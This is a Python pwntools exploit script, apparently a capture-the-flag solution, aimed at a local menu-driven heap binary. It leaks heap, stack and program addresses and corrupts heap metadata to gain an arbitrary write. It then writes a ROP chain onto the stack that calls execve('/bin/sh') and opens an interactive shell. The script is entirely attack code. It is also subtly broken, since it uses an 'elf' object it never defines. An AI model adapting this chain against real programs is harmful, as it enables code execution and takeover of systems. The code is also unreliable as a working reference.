#!/usr/bin/env python3

from pwn import *
import ast
# from LibcSearcher import *

context(arch="amd64", os="linux", log_level="debug")
context.terminal = ["tmux", "splitw", "-h"]

s = lambda content: io.send(content)
sl = lambda content: io.sendline(content)
sa = lambda content, send: io.sendafter(content, send)
sla = lambda content, send: io.sendlineafter(content, send)
rc = lambda number: io.recv(number)
ru = lambda content: io.recvuntil(content)


def slog(name, address):
    print("\033[40;31m[+]\033[40;35m" + name + "==>" + hex(address) + "\033[0m")


def debug(content=""):
    if content == "":
        gdb.attach(io)
    else:
        gdb.attach(io, content)


def get_address():
    return u64(ru(b"\x7f")[-6:].ljust(8, b"\x00"))


def add():
    sla("Choice > ", "1")


def delete(idx):
    sla("Choice > ", "4")
    sla("Index > ", str(idx))


def exit():
    sla("Choice > ", "5")


def bytes2array(array):
    string_data = array.decode("utf-8")
    try:
        normal_list = ast.literal_eval(string_data)
        # print("解析后的列表:")
        # print(normal_list)
        # print(f"列表的长度是: {len(normal_list)}")
        if len(normal_list) % 8 != 0:
            print("列表不是8的倍数")
        else:
            hex_list = []
            for i in range(0, len(normal_list), 8):
                chunk = normal_list[i : i + 8]
                byte_chunk = bytes(chunk)
                integer_value = int.from_bytes(byte_chunk, "little")
                hex_list.append(hex(integer_value))
            print(hex_list)
            return hex_list
    except (ValueError, SyntaxError) as e:
        print(f"解析出错: {e}")


def edit(idx, content):
    sla("Choice > ", "3")
    sla("Index > ", str(idx))
    sa("Content > ", content)
    ru("Content: ")
    return bytes2array(ru("]"))


def show(idx):
    sla("Choice > ", "2")
    sla("Index > ", str(idx))
    ru("Content: ")
    return bytes2array(ru("]"))


io = process("./pwn", "RUST_BACKTRACE=1")
add()  # 0
normal_list = show(0)
heap_base = int(normal_list[1], 16)
stack_addr = int(normal_list[4], 16)
elf.address = int(normal_list[5], 16) - 0x635B0
slog("heap_base", heap_base)
slog("stack_addr", stack_addr)
slog("elf address", elf.address)
# debug()
# payload = (
#     b"\x" * 0x20 + p64(heap_base + 0xBD0) + p64(0x51) + b"\x00" * 0x58 + p64(0x51)
#     # + b"\x00" * 0x50
#     # + p64(0x50)
#     # + p64(0x60)
# )
payload = p64(1) + p64(0x91) + p64(1) * 2 + p64(heap_base - 0x2010 + 0x30) + p64(0x1FE1)
edit(0, payload)

for _ in range(6):
    add()


def arbtrary_write(address, content):
    payload = p64(0) * 5 + p64(0x51) + p64(address)
    edit(1, payload)
    edit(0, content)


def rop_construct(address, content):
    for i in range(0, len(content), 8):
        arbtrary_write(address + i, content[i : i + 8])


ret = 0x16BD8 + elf.address
pop_rdi_rbp_ret = elf.address + 0x1DD45
syscall = elf.address + 0x26FCF
pop_rax_ret = elf.address + 0x16F3E
pop_rsi_rbp_ret = elf.address + 0x1E032
mov_rdx_rdi_18_rax_rdi_10_ret = elf.address + 0x4E906


target_addr = stack_addr + 0x3D0

payload = (
    p64(ret)
    + p64(pop_rdi_rbp_ret)
    + p64(target_addr + 0x18)
    + p64(0)
    + p64(pop_rsi_rbp_ret)
)
payload += (
    p64(0) + p64(0) + p64(mov_rdx_rdi_18_rax_rdi_10_ret) + p64(pop_rax_ret) + p64(59)
)
payload += p64(pop_rdi_rbp_ret) + p64(target_addr + 0x70) + p64(0)
payload += p64(syscall) + b"/bin/sh\x00"

rop_construct(target_addr, payload)
slog("target_addr", target_addr)

pause()
exit()

io.interactive()
